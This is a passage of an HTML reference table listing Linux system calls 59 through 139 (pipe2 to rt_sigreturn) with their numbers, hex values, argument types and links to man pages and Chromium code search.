href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pipe2">cs/</a></td><td align="center">0x3b</td><td>int *fildes</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">60</td><td>quotactl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/quotactl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*quotactl">cs/</a></td><td align="center">0x3c</td><td>unsigned int cmd</td><td>const char *special</td><td>qid_t id</td><td>void *addr</td><td>-</td><td>-</td></tr><tr><td align="center">61</td><td>getdents64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getdents64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getdents64">cs/</a></td><td align="center">0x3d</td><td>unsigned int fd</td><td>struct linux_dirent64 *dirent</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">62</td><td>lseek</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lseek.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lseek">cs/</a></td><td align="center">0x3e</td><td>unsigned int fd</td><td>off_t offset</td><td>unsigned int whence</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">63</td><td>read</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/read.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*read">cs/</a></td><td align="center">0x3f</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">64</td><td>write</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/write.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*write">cs/</a></td><td align="center">0x40</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">65</td><td>readv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readv">cs/</a></td><td align="center">0x41</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">66</td><td>writev</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/writev.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*writev">cs/</a></td><td align="center">0x42</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">67</td><td>pread64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pread64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pread64">cs/</a></td><td align="center">0x43</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td><td>loff_t pos</td><td>-</td><td>-</td></tr><tr><td align="center">68</td><td>pwrite64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pwrite64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pwrite64">cs/</a></td><td align="center">0x44</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td><td>loff_t pos</td><td>-</td><td>-</td></tr><tr><td align="center">69</td><td>preadv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/preadv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*preadv">cs/</a></td><td align="center">0x45</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>-</td></tr><tr><td align="center">70</td><td>pwritev</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pwritev.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pwritev">cs/</a></td><td align="center">0x46</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>-</td></tr><tr><td align="center">71</td><td>sendfile</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendfile.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendfile">cs/</a></td><td align="center">0x47</td><td>int out_fd</td><td>int in_fd</td><td>off_t *offset</td><td>size_t count</td><td>-</td><td>-</td></tr><tr><td align="center">72</td><td>pselect6</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pselect6.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pselect6">cs/</a></td><td align="center">0x48</td><td>int</td><td>fd_set *</td><td>fd_set *</td><td>fd_set *</td><td>struct __kernel_timespec *</td><td>void *</td></tr><tr><td align="center">73</td><td>ppoll</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ppoll.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ppoll">cs/</a></td><td align="center">0x49</td><td>struct pollfd *</td><td>unsigned int</td><td>struct __kernel_timespec *</td><td>const sigset_t *</td><td>size_t</td><td>-</td></tr><tr><td align="center">74</td><td>signalfd4</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/signalfd4.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*signalfd4">cs/</a></td><td align="center">0x4a</td><td>int ufd</td><td>sigset_t *user_mask</td><td>size_t sizemask</td><td>int flags</td><td>-</td><td>-</td></tr><tr><td align="center">75</td><td>vmsplice</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vmsplice.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vmsplice">cs/</a></td><td align="center">0x4b</td><td>int fd</td><td>const struct iovec *iov</td><td>unsigned long nr_segs</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td align="center">76</td><td>splice</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/splice.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*splice">cs/</a></td><td align="center">0x4c</td><td>int fd_in</td><td>loff_t *off_in</td><td>int fd_out</td><td>loff_t *off_out</td><td>size_t len</td><td>unsigned int flags</td></tr><tr><td align="center">77</td><td>tee</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/tee.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tee">cs/</a></td><td align="center">0x4d</td><td>int fdin</td><td>int fdout</td><td>size_t len</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td align="center">78</td><td>readlinkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readlinkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readlinkat">cs/</a></td><td align="center">0x4e</td><td>int dfd</td><td>const char *path</td><td>char *buf</td><td>int bufsiz</td><td>-</td><td>-</td></tr><tr><td align="center">79</td><td>newfstatat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/newfstatat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*newfstatat">cs/</a></td><td align="center">0x4f</td><td>int dfd</td><td>const char *filename</td><td>struct stat *statbuf</td><td>int flag</td><td>-</td><td>-</td></tr><tr><td align="center">80</td><td>fstat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fstat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstat">cs/</a></td><td align="center">0x50</td><td>unsigned int fd</td><td>struct __old_kernel_stat *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">81</td><td>sync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sync">cs/</a></td><td align="center">0x51</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">82</td><td>fsync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fsync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fsync">cs/</a></td><td align="center">0x52</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">83</td><td>fdatasync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fdatasync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fdatasync">cs/</a></td><td align="center">0x53</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">84</td><td>sync_file_range</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sync_file_range.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sync_file_range">cs/</a></td><td align="center">0x54</td><td>int fd</td><td>loff_t offset</td><td>loff_t nbytes</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td align="center">85</td><td>timerfd_create</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_create">cs/</a></td><td align="center">0x55</td><td>int clockid</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">86</td><td>timerfd_settime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_settime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_settime">cs/</a></td><td align="center">0x56</td><td>int ufd</td><td>int flags</td><td>const struct __kernel_itimerspec *utmr</td><td>struct __kernel_itimerspec *otmr</td><td>-</td><td>-</td></tr><tr><td align="center">87</td><td>timerfd_gettime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_gettime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_gettime">cs/</a></td><td align="center">0x57</td><td>int ufd</td><td>struct __kernel_itimerspec *otmr</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">88</td><td>utimensat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/utimensat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*utimensat">cs/</a></td><td align="center">0x58</td><td>int dfd</td><td>const char *filename</td><td>struct __kernel_timespec *utimes</td><td>int flags</td><td>-</td><td>-</td></tr><tr><td align="center">89</td><td>acct</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/acct.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*acct">cs/</a></td><td align="center">0x59</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">90</td><td>capget</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/capget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*capget">cs/</a></td><td align="center">0x5a</td><td>cap_user_header_t header</td><td>cap_user_data_t dataptr</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">91</td><td>capset</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/capset.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*capset">cs/</a></td><td align="center">0x5b</td><td>cap_user_header_t header</td><td>const cap_user_data_t data</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">92</td><td>personality</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/personality.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*personality">cs/</a></td><td align="center">0x5c</td><td>unsigned int personality</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">93</td><td>exit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/exit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*exit">cs/</a></td><td align="center">0x5d</td><td>int error_code</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">94</td><td>exit_group</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/exit_group.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*exit_group">cs/</a></td><td align="center">0x5e</td><td>int error_code</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">95</td><td>waitid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/waitid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*waitid">cs/</a></td><td align="center">0x5f</td><td>int which</td><td>pid_t pid</td><td>struct siginfo *infop</td><td>int options</td><td>struct rusage *ru</td><td>-</td></tr><tr><td align="center">96</td><td>set_tid_address</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/set_tid_address.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_tid_address">cs/</a></td><td align="center">0x60</td><td>int *tidptr</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">97</td><td>unshare</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/unshare.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*unshare">cs/</a></td><td align="center">0x61</td><td>unsigned long unshare_flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">98</td><td>futex</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/futex.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*futex">cs/</a></td><td align="center">0x62</td><td>u32 *uaddr</td><td>int op</td><td>u32 val</td><td>struct __kernel_timespec *utime</td><td>u32 *uaddr2</td><td>u32 val3</td></tr><tr><td align="center">99</td><td>set_robust_list</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/set_robust_list.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_robust_list">cs/</a></td><td align="center">0x63</td><td>struct robust_list_head *head</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">100</td><td>get_robust_list</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/get_robust_list.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*get_robust_list">cs/</a></td><td align="center">0x64</td><td>int pid</td><td>struct robust_list_head * *head_ptr</td><td>size_t *len_ptr</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">101</td><td>nanosleep</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/nanosleep.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*nanosleep">cs/</a></td><td align="center">0x65</td><td>struct __kernel_timespec *rqtp</td><td>struct __kernel_timespec *rmtp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">102</td><td>getitimer</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getitimer.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getitimer">cs/</a></td><td align="center">0x66</td><td>int which</td><td>struct itimerval *value</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">103</td><td>setitimer</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setitimer.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setitimer">cs/</a></td><td align="center">0x67</td><td>int which</td><td>struct itimerval *value</td><td>struct itimerval *ovalue</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">104</td><td>kexec_load</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/kexec_load.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kexec_load">cs/</a></td><td align="center">0x68</td><td>unsigned long entry</td><td>unsigned long nr_segments</td><td>struct kexec_segment *segments</td><td>unsigned long flags</td><td>-</td><td>-</td></tr><tr><td align="center">105</td><td>init_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/init_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*init_module">cs/</a></td><td align="center">0x69</td><td>void *umod</td><td>unsigned long len</td><td>const char *uargs</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">106</td><td>delete_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/delete_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*delete_module">cs/</a></td><td align="center">0x6a</td><td>const char *name_user</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">107</td><td>timer_create</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_create">cs/</a></td><td align="center">0x6b</td><td>clockid_t which_clock</td><td>struct sigevent *timer_event_spec</td><td>timer_t * created_timer_id</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">108</td><td>timer_gettime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_gettime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_gettime">cs/</a></td><td align="center">0x6c</td><td>timer_t timer_id</td><td>struct __kernel_itimerspec *setting</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">109</td><td>timer_getoverrun</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_getoverrun.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_getoverrun">cs/</a></td><td align="center">0x6d</td><td>timer_t timer_id</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">110</td><td>timer_settime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_settime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_settime">cs/</a></td><td align="center">0x6e</td><td>timer_t timer_id</td><td>int flags</td><td>const struct __kernel_itimerspec *new_setting</td><td>struct __kernel_itimerspec *old_setting</td><td>-</td><td>-</td></tr><tr><td align="center">111</td><td>timer_delete</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_delete.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_delete">cs/</a></td><td align="center">0x6f</td><td>timer_t timer_id</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">112</td><td>clock_settime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_settime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_settime">cs/</a></td><td align="center">0x70</td><td>clockid_t which_clock</td><td>const struct __kernel_timespec *tp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">113</td><td>clock_gettime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_gettime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_gettime">cs/</a></td><td align="center">0x71</td><td>clockid_t which_clock</td><td>struct __kernel_timespec *tp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">114</td><td>clock_getres</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_getres.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_getres">cs/</a></td><td align="center">0x72</td><td>clockid_t which_clock</td><td>struct __kernel_timespec *tp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">115</td><td>clock_nanosleep</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_nanosleep.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_nanosleep">cs/</a></td><td align="center">0x73</td><td>clockid_t which_clock</td><td>int flags</td><td>const struct __kernel_timespec *rqtp</td><td>struct __kernel_timespec *rmtp</td><td>-</td><td>-</td></tr><tr><td align="center">116</td><td>syslog</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/syslog.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*syslog">cs/</a></td><td align="center">0x74</td><td>int type</td><td>char *buf</td><td>int len</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">117</td><td>ptrace</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ptrace.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ptrace">cs/</a></td><td align="center">0x75</td><td>long request</td><td>long pid</td><td>unsigned long addr</td><td>unsigned long data</td><td>-</td><td>-</td></tr><tr><td align="center">118</td><td>sched_setparam</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setparam.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setparam">cs/</a></td><td align="center">0x76</td><td>pid_t pid</td><td>struct sched_param *param</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">119</td><td>sched_setscheduler</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setscheduler.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setscheduler">cs/</a></td><td align="center">0x77</td><td>pid_t pid</td><td>int policy</td><td>struct sched_param *param</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">120</td><td>sched_getscheduler</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getscheduler.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getscheduler">cs/</a></td><td align="center">0x78</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">121</td><td>sched_getparam</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getparam.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getparam">cs/</a></td><td align="center">0x79</td><td>pid_t pid</td><td>struct sched_param *param</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">122</td><td>sched_setaffinity</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setaffinity.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setaffinity">cs/</a></td><td align="center">0x7a</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long *user_mask_ptr</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">123</td><td>sched_getaffinity</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getaffinity.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getaffinity">cs/</a></td><td align="center">0x7b</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long *user_mask_ptr</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">124</td><td>sched_yield</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_yield.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_yield">cs/</a></td><td align="center">0x7c</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">125</td><td>sched_get_priority_max</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_get_priority_max.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_get_priority_max">cs/</a></td><td align="center">0x7d</td><td>int policy</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">126</td><td>sched_get_priority_min</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_get_priority_min.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_get_priority_min">cs/</a></td><td align="center">0x7e</td><td>int policy</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">127</td><td>sched_rr_get_interval</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_rr_get_interval.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_rr_get_interval">cs/</a></td><td align="center">0x7f</td><td>pid_t pid</td><td>struct __kernel_timespec *interval</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">128</td><td>restart_syscall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/restart_syscall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*restart_syscall">cs/</a></td><td align="center">0x80</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">129</td><td>kill</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/kill.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kill">cs/</a></td><td align="center">0x81</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">130</td><td>tkill</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/tkill.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tkill">cs/</a></td><td align="center">0x82</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">131</td><td>tgkill</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/tgkill.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tgkill">cs/</a></td><td align="center">0x83</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">132</td><td>sigaltstack</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sigaltstack.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigaltstack">cs/</a></td><td align="center">0x84</td><td>const struct sigaltstack *uss</td><td>struct sigaltstack *uoss</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">133</td><td>rt_sigsuspend</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigsuspend.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigsuspend">cs/</a></td><td align="center">0x85</td><td>sigset_t *unewset</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">134</td><td>rt_sigaction</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigaction.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigaction">cs/</a></td><td align="center">0x86</td><td>int</td><td>const struct sigaction *</td><td>struct sigaction *</td><td>size_t</td><td>-</td><td>-</td></tr><tr><td align="center">135</td><td>rt_sigprocmask</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigprocmask.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigprocmask">cs/</a></td><td align="center">0x87</td><td>int how</td><td>sigset_t *set</td><td>sigset_t *oset</td><td>size_t sigsetsize</td><td>-</td><td>-</td></tr><tr><td align="center">136</td><td>rt_sigpending</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigpending.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigpending">cs/</a></td><td align="center">0x88</td><td>sigset_t *set</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">137</td><td>rt_sigtimedwait</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigtimedwait.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigtimedwait">cs/</a></td><td align="center">0x89</td><td>const sigset_t *uthese</td><td>siginfo_t *uinfo</td><td>const struct __kernel_timespec *uts</td><td>size_t sigsetsize</td><td>-</td><td>-</td></tr><tr><td align="center">138</td><td>rt_sigqueueinfo</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigqueueinfo.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigqueueinfo">cs/</a></td><td align="center">0x8a</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t *uinfo</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">139</td><td>rt_sigreturn</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigreturn.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigreturn">cs/</a></td><td align="center">0x8b</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td 